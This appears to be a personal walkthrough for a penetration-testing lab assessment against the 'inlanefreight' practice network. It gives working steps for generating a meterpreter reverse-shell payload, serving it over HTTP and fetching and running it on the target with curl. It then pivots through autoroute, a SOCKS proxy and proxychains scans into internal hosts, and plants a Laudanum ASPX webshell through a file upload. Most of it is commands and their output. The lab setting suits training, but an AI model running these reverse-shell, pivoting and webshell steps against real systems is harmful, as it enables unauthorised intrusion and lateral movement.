
The foothold can call back to my machine, so I will open a meterpreter reverse shell

## Preparation

### 1 -  {Attacking Machine}Generate Payload to call back home 
```
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o reverse.sh
```

### 2 - {Attacking Machine}Run msfconsole connection handler
```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_tcp; set LHOST tun0; set LPORT '4444'; run"
```

### 3 - {Attacking Machine}Starting a pyhton HTTP Server

The server is going to be started in the port 8080 and will be bind to **tun0 ** interface IP, therefore only accepting connections from that network

```
python3 -m http.server 8080 -b $(ip addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
```


### 4 - {Target Machine}Get the Payload from the attacking machine 

Attention to:

- That IP was mine at that moment
- filename was the defined earlier, when the payload was generated
- The output folder,  I choose **/tmp** , because usually there are no permissions problems.

```
curl http://10.10.14.220:8080/reverse.sh --output /tmp/shell.sh
```

Once the file is downloaded, you can shutdown the python server on the attacking machine

### 5 - {Target Machine}Grant execution permission and executing the payload

```
chmod u+x shell.sh
```

This grants the owner of the file permission to execute

Now, executes 

```
/tmp/shell.sh
```


This will grant us a meterpreter shell


### 6 - {Attacking Machine} Pivoting

Now that we have a shell in the foothold machine lets check the hosts file for  other hosts  or networks of interest

```
$ cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  skills-foothold
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local

```

add vhosts to local host file

```
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local
```

check the network interfaces 

```
$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:81:92 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet **10.129.204.126**/16 brd 10.129.255.255 scope global dynamic ens192
       valid_lft 2046sec preferred_lft 2046sec
    inet6 dead:beef::250:56ff:feb9:8192/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:8192/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:56:69 brd ff:ff:ff:ff:ff:ff
    altname enp19s0
    inet **172.16.1.5**/23 brd 172.16.1.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:5669/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:8e:e1:38:b8 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever

```

Press "ctrl+z" to background the  meterpreter session 

```
meterpreter > 
Background session 1? [y/N]  
```

Now we will add the routes from the target machine, the data 

```
msf6 exploit(multi/handler) > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)


View the full module info with the info, or info -d command.

msf6 post(multi/manage/autoroute) > set session 1
session => 1
msf6 post(multi/manage/autoroute) > run

[*] Running module against 10.129.204.126
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.254.0 from host's routing table.
[+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.0.0         255.255.254.0      Session 1
   172.17.0.0         255.255.0.0        Session 1
[*] There are currently no IPv6 routes defined.

```

```
meterpreter > route

IPv4 network routes
===================

    Subnet      Netmask        Gateway     Metric  Interface
    ------      -------        -------     ------  ---------
    0.0.0.0     0.0.0.0        10.129.0.1  0       ens192
    10.129.0.0  255.255.0.0    0.0.0.0     0       ens192
    172.16.0.0  255.255.254.0  0.0.0.0     0       ens224
    172.17.0.0  255.255.0.0    0.0.0.0     0       docker0

```

Enable Sock Proxy
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
SRVPORT => 1080
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) >
[*] Starting the SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy

msf6 auxiliary(server/socks_proxy) >

```

proxychains setup
 make sure that this is the only socks enabled in the file, comment the other if necessary

```
sudo sh -c "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf"
```

using proxychains

```
sudo proxychains4 -f /etc/proxychains4.conf nmap -n -sT -sV -PN status.inlanefreight.local
```

---


## HOST - 1


## What is the hostname of Host-1? (Format: all lower case)

### 1.1 Enumeration

```
$sudo proxychains4 -f /etc/proxychains4.conf nmap -n -sT -sV -PN status.inlanefreight.local
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.14s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
515/tcp  open  printer       Microsoft lpd
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8080/tcp open  http          Apache Tomcat 10.0.11
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 531.19 seconds

```

if you access the first service through a browser,  don't forget to enable the socks proxy manually in  the browser configuration, so you can gain advantage of pivoting.
![[Pasted image 20240428191919.png]]

> The asnwer is : **shells-winsvr**

## 2 -  Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)

As seen in the  image above, we have a field to upload configuration files, lets try to upload any file that is not  *zip or tar.gz*

![[Pasted image 20240428192510.png]]

The uploader accepted a png file, now lets try an aspx webshell

```
cp /usr/share/laudanum/aspx/shell.aspx laudanum_shell.aspx
```

Just remember to add your IP into the  array **string[] allowedIps** inside the script





---

## Host 2